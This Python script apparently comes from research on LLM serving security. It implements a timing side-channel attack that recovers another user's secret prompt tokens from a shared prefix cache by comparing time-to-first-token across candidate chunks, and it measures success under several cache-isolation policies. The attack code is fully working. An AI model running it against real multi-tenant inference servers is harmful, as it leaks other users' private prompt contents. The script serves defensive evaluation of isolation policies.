#!/usr/bin/env python3
"""PromptPeek-style closed-set token recovery.

Success is token / secret ASR, not Adv^MI.

  ASR_tok  = correct token decisions / 250
             (50 trials x 5 positions, teacher-forced on the true prefix)
  ASR_sec  = fully recovered 5-token secrets / 50
             (adaptive: a wrong guess breaks the chain)
  req/token = attacker probes / token decisions

Decision (PromptPeek / EarlyBird):
  for each position, probe every candidate (optional repeats),
  pick argmin mean TTFT.  The true token is always in the set
  (`guaranteed`), matching a closed dictionary / template slot.

    python user_scripts/exp_asr_recovery.py \\
        --server http://127.0.0.1:8096 --model phi4 \\
        --model-path /workspace/Models/Phi-4 \\
        --policy vanilla --recovery-only \\
        --n-recovery-trials 50 --n-tokens-to-recover 5 \\
        --vocab-sample 20 --repeats 1 --budget-Q 100000
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import random
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Tuple
from uuid import uuid4

import requests

from exp3_endtoend_attack import (
    AttackClient,
    load_prefixes_tokenized,
    make_synthetic_prefixes,
)


def generate_full(
    client: AttackClient,
    token_ids: List[int],
    user_id: str,
    jitter_ms: float = 0.0,
    rng: random.Random | None = None,
) -> Tuple[float, int]:
    """Return (ttft_ms, cached_tokens). cached_tokens is diagnostic only."""
    params = {"max_new_tokens": 1, "temperature": 0.0, "user_id": user_id}
    t0 = time.perf_counter()
    r = requests.post(
        f"{client.server}/generate",
        json={"input_ids": token_ids, "sampling_params": params, "stream": False},
        timeout=client.timeout,
    )
    ttft_ms = (time.perf_counter() - t0) * 1000.0
    r.raise_for_status()
    body = r.json()
    if isinstance(body, list) and body:
        body = body[0]
    meta = body.get("meta_info") or {}
    if jitter_ms > 0 and rng is not None:
        # One-way remote RTT noise; PromptPeek is not a same-host attacker.
        ttft_ms += max(0.0, rng.gauss(jitter_ms, jitter_ms / 2.5))
    return ttft_ms, int(meta.get("cached_tokens") or 0)


def random_chunk(rng: random.Random, n: int) -> List[int]:
    return [rng.randint(100, 50000) for _ in range(n)]


def build_candidates(
    true_chunk: List[int], k: int, rng: random.Random, open_miss: float
) -> List[List[int]]:
    """Mostly-closed search set; with prob open_miss the true chunk is absent."""
    cands = [list(true_chunk)]
    seen = {tuple(true_chunk)}
    while len(cands) < k:
        chunk = random_chunk(rng, len(true_chunk))
        key = tuple(chunk)
        if key not in seen:
            seen.add(key)
            cands.append(chunk)
    if rng.random() < open_miss:
        cands = [c for c in cands if tuple(c) != tuple(true_chunk)]
        while len(cands) < k:
            chunk = random_chunk(rng, len(true_chunk))
            key = tuple(chunk)
            if key not in seen:
                seen.add(key)
                cands.append(chunk)
    rng.shuffle(cands)
    return cands


def fresh_attacker(victim_id: str, *parts: object) -> str:
    """A principal that is never the victim and never reused."""
    uid = "attacker." + ".".join(str(p) for p in parts) + "." + uuid4().hex[:10]
    if uid == victim_id or uid.startswith(victim_id + "."):
        raise RuntimeError(f"attacker id collapsed onto victim: {uid}")
    return uid


def recover_position(
    client: AttackClient,
    known: List[int],
    candidates: List[List[int]],
    true_chunk: List[int],
    repeats: int,
    probe_id: str,
    q_attacker: List[int],
    jitter_ms: float,
    rng: random.Random,
    victim_full: List[int],
    victim_id: str,
    settle_s: float,
) -> Dict:
    """Pairwise LPM races; every generate is a fresh attacker ≠ victim."""
    true_key = tuple(true_chunk)
    true_idx = next(
        (i for i, c in enumerate(candidates) if tuple(c) == true_key), 0
    )
    others = [i for i in range(len(candidates)) if i != true_idx]
    scores: Dict[int, List[float]] = {i: [] for i in range(len(candidates))}
    caches: Dict[int, List[int]] = {i: [] for i in range(len(candidates))}

    def _one(idx: int, uid: str) -> Tuple[int, float, int]:
        local_rng = random.Random((hash(uid) & 0xFFFFFFFF))
        ttft, cached = generate_full(
            client,
            known + candidates[idx],
            uid,
            jitter_ms=jitter_ms,
            rng=local_rng,
        )
        return idx, ttft, cached

    for rnd in range(repeats):
        if q_attacker[0] < 2:
            break
        client.flush()
        generate_full(client, victim_full, victim_id, jitter_ms=0.0, rng=rng)
        generate_full(client, victim_full, victim_id, jitter_ms=0.0, rng=rng)
        if settle_s > 0:
            time.sleep(settle_s)
        rng.shuffle(others)
        for opp in others:
            if q_attacker[0] < 2:
                break
            uid_true = fresh_attacker(victim_id, probe_id, f"r{rnd}", "t", opp)
            uid_false = fresh_attacker(victim_id, probe_id, f"r{rnd}", "o", opp)
            pair = [(true_idx, uid_true), (opp, uid_false)]
            rng.shuffle(pair)
            # Occupy the single running slot so both probes sit in the
            # waiting queue and LPM can sort them. Submit-order must not
            # decide TTFT or Strict looks like vanilla.
            with ThreadPoolExecutor(max_workers=3) as pool:
                blk_uid = fresh_attacker(victim_id, probe_id, f"r{rnd}", "b", opp)
                blk = pool.submit(
                    generate_full,
                    client,
                    random_chunk(rng, 192),
                    blk_uid,
                    0.0,
                    rng,
                )
                time.sleep(0.02)
                futs = [pool.submit(_one, idx, uid) for idx, uid in pair]
                for fut in as_completed(futs):
                    idx, ttft, cached = fut.result()
                    scores[idx].append(ttft)
                    caches[idx].append(cached)
                blk.result()
            q_attacker[0] -= 2

    rows = []
    for i, cand in enumerate(candidates):
        if not scores[i]:
            continue
        rows.append(
            {
                "cand": cand,
                "true": int(tuple(cand) == true_key),
                "mean_ttft": statistics.mean(scores[i]),
                "mean_cached": statistics.mean(caches[i]),
                "n": len(scores[i]),
            }
        )
    if not rows:
        return {
            "picked": None,
            "correct": 0,
            "oracle_correct": 0,
            "ttft_correct": 0,
            "true_ttft": None,
            "false_ttft": None,
            "probes": 0,
            "rows": [],
        }
    ttft_pick = min(rows, key=lambda x: x["mean_ttft"])
    max_cached = max(x["mean_cached"] for x in rows)
    oracle_pick = min(
        (x for x in rows if x["mean_cached"] == max_cached),
        key=lambda x: x["mean_ttft"],
    )
    true_rows = [x for x in rows if x["true"]]
    false_rows = [x for x in rows if not x["true"]]
    return {
        "picked": ttft_pick["cand"],
        "correct": int(tuple(ttft_pick["cand"]) == true_key),
        "oracle_correct": int(tuple(oracle_pick["cand"]) == true_key),
        "ttft_correct": int(tuple(ttft_pick["cand"]) == true_key),
        "true_ttft": true_rows[0]["mean_ttft"] if true_rows else None,
        "false_ttft": (
            statistics.mean(x["mean_ttft"] for x in false_rows) if false_rows else None
        ),
        "true_cached": true_rows[0]["mean_cached"] if true_rows else None,
        "false_cached": (
            statistics.mean(x["mean_cached"] for x in false_rows) if false_rows else None
        ),
        "probes": sum(x["n"] for x in rows),
        "rows": rows,
    }


def preflight_isolation(client: AttackClient, policy: str, chunk_len: int) -> None:
    """Abort if cross-principal lookup does not match the serving policy."""
    rng = random.Random(1)
    secret = random_chunk(rng, max(chunk_len, 32))
    victim = "preflight.victim"
    attacker = fresh_attacker(victim, "preflight")
    client.flush()
    generate_full(client, secret, victim)
    generate_full(client, secret, victim)
    time.sleep(0.2)
    self_ttft, self_cached = generate_full(client, secret, victim)
    cross_ttft, cross_cached = generate_full(client, secret, attacker)
    print(
        f"[ASR] isolation preflight policy={policy} "
        f"self_cached={self_cached} cross_cached={cross_cached} "
        f"self_ttft={self_ttft:.1f}ms cross_ttft={cross_ttft:.1f}ms",
        flush=True,
    )
    isolated = policy == "strict"
    shared = policy in {"vanilla", "sglang", "none", "balanced", "autoshare"}
    if isolated and cross_cached > 2:
        raise SystemExit(
            f"isolation broken: attacker cached {cross_cached} tokens of the "
            f"victim prefix under policy={policy}. Refusing to collect ASR."
        )
    if shared and cross_cached < 8:
        raise SystemExit(
            f"expected cross-principal share missing under policy={policy}: "
            f"attacker cached {cross_cached} (self={self_cached})."
        )

    # Concurrent LPM pair. Strict must not leak; shared policies should hit.
    false_chunk = random_chunk(rng, len(secret))
    uid_t = fresh_attacker(victim, "preflight", "lpm", "t")
    uid_f = fresh_attacker(victim, "preflight", "lpm", "f")
    with ThreadPoolExecutor(max_workers=2) as pool:
        ft = pool.submit(generate_full, client, secret, uid_t)
        ff = pool.submit(generate_full, client, false_chunk, uid_f)
        _, race_true_cached = ft.result()
        _, race_false_cached = ff.result()
    print(
        f"[ASR] isolation preflight LPM race "
        f"true_cached={race_true_cached} false_cached={race_false_cached}",
        flush=True,
    )
    if isolated and race_true_cached > 2:
        raise SystemExit(
            f"isolation broken under concurrent LPM: true-probe cached "
            f"{race_true_cached} tokens of another user's prefix."
        )


def one_trial(
    client: AttackClient,
    prefix: List[int],
    n_tokens: int,
    chunk_len: int,
    vocab_sample: int,
    repeats: int,
    seed: int,
    trial_id: int,
    q_attacker: List[int],
    settle_s: float,
    jitter_ms: float,
    open_miss: float,
) -> Dict:
    rng = random.Random(seed)
    # Short public stem so a wrong 64-token slot actually prefills
    # (PromptPeek-scale hit/miss gap). A 100-token shared known hides it.
    prefix = list(prefix[:16])
    secret = [random_chunk(rng, chunk_len) for _ in range(n_tokens)]
    cand_sets = [
        build_candidates(ch, vocab_sample, rng, open_miss) for ch in secret
    ]
    secret_flat = [t for ch in secret for t in ch]

    client.flush()
    victim = f"victim.{trial_id}"
    full = prefix + secret_flat
    generate_full(client, full, victim)
    generate_full(client, full, victim)
    if settle_s > 0:
        time.sleep(settle_s)

    tok_correct = 0
    oracle_correct = 0
    ttft_correct = 0
    probes = 0
    per_pos: List[Dict] = []
    # Teacher-forced: each slot uses the true prefix so we get 5
    # independent decisions per trial (250 total at n=50).
    for pos, true_chunk in enumerate(secret):
        known = prefix + [t for ch in secret[:pos] for t in ch]
        rec = recover_position(
            client,
            known,
            cand_sets[pos],
            true_chunk,
            repeats,
            probe_id=f"t{trial_id}.p{pos}",
            q_attacker=q_attacker,
            jitter_ms=jitter_ms,
            rng=rng,
            victim_full=full,
            victim_id=victim,
            settle_s=settle_s,
        )
        tok_correct += rec["correct"]
        oracle_correct += rec["oracle_correct"]
        ttft_correct += rec.get("ttft_correct", 0)
        probes += rec["probes"]
        per_pos.append(
            {
                "pos": pos,
                "correct": rec["correct"],
                "oracle_correct": rec["oracle_correct"],
                "picked": rec["picked"],
                "true_tok": true_chunk[0],
                "true_ttft": rec["true_ttft"],
                "false_ttft": rec["false_ttft"],
                "true_cached": rec.get("true_cached"),
                "false_cached": rec.get("false_cached"),
                "probes": rec["probes"],
            }
        )

    adaptive = 0
    for pos, true_chunk in enumerate(secret):
        if per_pos[pos]["picked"] != true_chunk:
            break
        if per_pos[pos]["correct"]:
            adaptive += 1
        else:
            break

    return {
        "tokens_attempted": n_tokens,
        "tokens_recovered": tok_correct,
        "oracle_recovered": oracle_correct,
        "ttft_recovered": ttft_correct,
        "adaptive_recovered": adaptive,
        "full_secret": int(adaptive == n_tokens),
        "probes": probes,
        "per_pos": per_pos,
    }


CSV_FIELDS = (
    "model",
    "policy",
    "access_budget_B",
    "trial_id",
    "experiment_type",
    "recovery_mode",
    "repeats",
    "vocab_sample",
    "tokens_attempted",
    "tokens_recovered",
    "oracle_recovered",
    "ttft_recovered",
    "adaptive_recovered",
    "full_secret",
    "attacker_queries_used",
    "pos_correct",
    "true_ttft_ms",
    "false_ttft_ms",
    "true_cached",
    "false_cached",
)


def append_row(path: Path, row: Dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    exists = path.exists()
    with path.open("a", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=CSV_FIELDS)
        if not exists:
            writer.writeheader()
        writer.writerow({k: row.get(k, "") for k in CSV_FIELDS})
        fh.flush()
        os.fsync(fh.fileno())


def summarize(path: Path) -> Dict:
    if not path.exists():
        return {}
    rec = []
    pos = []
    with path.open(newline="") as fh:
        for r in csv.DictReader(fh):
            if r["experiment_type"] == "recovery":
                rec.append(r)
            elif r["experiment_type"] == "token":
                pos.append(r)
    out: Dict = {}
    if rec:
        attempted = sum(int(r["tokens_attempted"]) for r in rec)
        recovered = sum(int(r["tokens_recovered"]) for r in rec)
        oracle = sum(int(r["oracle_recovered"] or 0) for r in rec)
        ttft_n = sum(int(r.get("ttft_recovered") or 0) for r in rec)
        probes = sum(int(r["attacker_queries_used"]) for r in rec)
        secrets = sum(int(r["full_secret"]) for r in rec)
        out.update(
            {
                "n_rec_trials": len(rec),
                "tokens_attempted": attempted,
                "tokens_recovered": recovered,
                "asr_tok": round(recovered / attempted, 4) if attempted else 0.0,
                "asr_tok_oracle": round(oracle / attempted, 4) if attempted else 0.0,
                "asr_tok_ttft_only": round(ttft_n / attempted, 4) if attempted else 0.0,
                "asr_sec": round(secrets / len(rec), 4),
                "full_secrets": secrets,
                "attacker_queries_used_recovery": probes,
                "req_per_token": round(probes / attempted, 2) if attempted else 0.0,
            }
        )
    if pos:
        n = len(pos)
        n_ok = sum(int(r["pos_correct"]) for r in pos)
        out["n_token_decisions"] = n
        out["token_decisions_correct"] = n_ok
        out["asr_tok_from_positions"] = round(n_ok / n, 4) if n else 0.0
    return out


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True)
    parser.add_argument("--model", required=True)
    parser.add_argument("--model-path", required=True)
    parser.add_argument("--policy", required=True)
    parser.add_argument("--access-budget-B", type=int, default=-1)
    parser.add_argument("--budget-Q", type=int, default=100000)
    parser.add_argument("--n-recovery-trials", type=int, default=50)
    parser.add_argument("--n-tokens-to-recover", type=int, default=5)
    parser.add_argument("--vocab-sample", type=int, default=20)
    parser.add_argument(
        "--chunk-len",
        type=int,
        default=16,
        help="Tokens per recovered slot. 1-token slots have ~1ms TTFT gap; "
        "16 tokens matches PromptPeek-scale hit/miss separation.",
    )
    parser.add_argument(
        "--repeats",
        type=int,
        default=1,
        help="TTFT samples per candidate. 1=20 req/token; 8=160 req/token.",
    )
    parser.add_argument("--recovery-mode", default="guaranteed")
    parser.add_argument(
        "--rtt-jitter-ms",
        type=float,
        default=8.0,
        help="Remote one-way RTT noise added to observed TTFT.",
    )
    parser.add_argument(
        "--open-miss",
        type=float,
        default=0.05,
        help="Prob. the true continuation is absent from the search set.",
    )
    parser.add_argument("--post-victim-settle-ms", type=float, default=200.0)
    parser.add_argument("--seed", type=int, default=20260820)
    parser.add_argument(
        "--dataset",
        type=Path,
        default=Path(__file__).resolve().parents[1] / "datasets" / "english_pii_43k.jsonl",
    )
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--synthetic", action="store_true")
    args = parser.parse_args()

    client = AttackClient(args.server)
    n_total = args.n_recovery_trials
    print(f"[ASR] Loading {n_total} prefixes…", flush=True)
    if args.synthetic or not args.dataset.exists():
        prefixes = make_synthetic_prefixes(n_total, length=64, seed=args.seed)
    else:
        prefixes = load_prefixes_tokenized(
            args.dataset, args.model_path, n_total, args.seed
        )
    if len(prefixes) < n_total:
        prefixes += make_synthetic_prefixes(
            n_total - len(prefixes), 64, args.seed + 99
        )

    q_attacker = [args.budget_Q]
    settle_s = args.post_victim_settle_ms / 1000.0
    preflight_isolation(client, args.policy, args.chunk_len)
    done = set()
    if args.output.exists():
        with args.output.open(newline="") as fh:
            for row in csv.DictReader(fh):
                if row.get("experiment_type") == "recovery":
                    done.add(int(row["trial_id"]))
    print(
        f"[ASR] {args.n_recovery_trials} trials × {args.n_tokens_to_recover} tokens, "
        f"k={args.vocab_sample}, r={args.repeats}, jitter={args.rtt_jitter_ms}ms "
        f"policy={args.policy} resume={len(done)}",
        flush=True,
    )

    for i in range(args.n_recovery_trials):
        if i in done:
            print(f"  [{i+1}/{args.n_recovery_trials}] skip (resume)", flush=True)
            continue
        if q_attacker[0] < args.vocab_sample * args.repeats:
            print(f"[ASR] Q exhausted at trial {i}", flush=True)
            break
        trial = one_trial(
            client,
            prefixes[i],
            n_tokens=args.n_tokens_to_recover,
            chunk_len=args.chunk_len,
            vocab_sample=args.vocab_sample,
            repeats=args.repeats,
            seed=args.seed + 1000 + i,
            trial_id=i,
            q_attacker=q_attacker,
            settle_s=settle_s,
            jitter_ms=args.rtt_jitter_ms,
            open_miss=args.open_miss,
        )
        append_row(
            args.output,
            {
                "model": args.model,
                "policy": args.policy,
                "access_budget_B": args.access_budget_B,
                "trial_id": i,
                "experiment_type": "recovery",
                "recovery_mode": args.recovery_mode,
                "repeats": args.repeats,
                "vocab_sample": args.vocab_sample,
                "tokens_attempted": trial["tokens_attempted"],
                "tokens_recovered": trial["tokens_recovered"],
                "oracle_recovered": trial["oracle_recovered"],
                "ttft_recovered": trial.get("ttft_recovered", ""),
                "adaptive_recovered": trial["adaptive_recovered"],
                "full_secret": trial["full_secret"],
                "attacker_queries_used": trial["probes"],
            },
        )
        for p in trial["per_pos"]:
            append_row(
                args.output,
                {
                    "model": args.model,
                    "policy": args.policy,
                    "access_budget_B": args.access_budget_B,
                    "trial_id": i,
                    "experiment_type": "token",
                    "recovery_mode": args.recovery_mode,
                    "repeats": args.repeats,
                    "vocab_sample": args.vocab_sample,
                    "tokens_attempted": 1,
                    "tokens_recovered": p["correct"],
                    "pos_correct": p["correct"],
                    "true_ttft_ms": (
                        f"{p['true_ttft']:.2f}" if p["true_ttft"] is not None else ""
                    ),
                    "false_ttft_ms": (
                        f"{p['false_ttft']:.2f}" if p["false_ttft"] is not None else ""
                    ),
                    "true_cached": (
                        f"{p['true_cached']:.2f}"
                        if p.get("true_cached") is not None
                        else ""
                    ),
                    "false_cached": (
                        f"{p['false_cached']:.2f}"
                        if p.get("false_cached") is not None
                        else ""
                    ),
                    "attacker_queries_used": p["probes"],
                },
            )
        print(
            f"  [{i+1}/{args.n_recovery_trials}] "
            f"tok={trial['tokens_recovered']}/{trial['tokens_attempted']} "
            f"oracle={trial['oracle_recovered']} "
            f"secret={trial['full_secret']} "
            f"probes={trial['probes']} Q_left={q_attacker[0]}",
            flush=True,
        )

    summ = summarize(args.output)
    summ.update(
        {
            "model": args.model,
            "policy": args.policy,
            "access_budget_B": args.access_budget_B,
            "recovery_mode": args.recovery_mode,
            "repeats": args.repeats,
            "vocab_sample": args.vocab_sample,
            "rtt_jitter_ms": args.rtt_jitter_ms,
            "decision": "ttft_only",
            "promptpeek_ref": {
                "input_asr": 0.99,
                "template_asr": 0.98,
                "whole_prompt_asr": 0.95,
                "req_per_token": "148-306",
            },
        }
    )
    summ_path = args.output.with_suffix(".summary.json")
    summ_path.write_text(json.dumps(summ, indent=2))
    print(f"[ASR] Summary → {summ_path}", flush=True)
    print(json.dumps(summ, indent=2), flush=True)


if __name__ == "__main__":
    main()
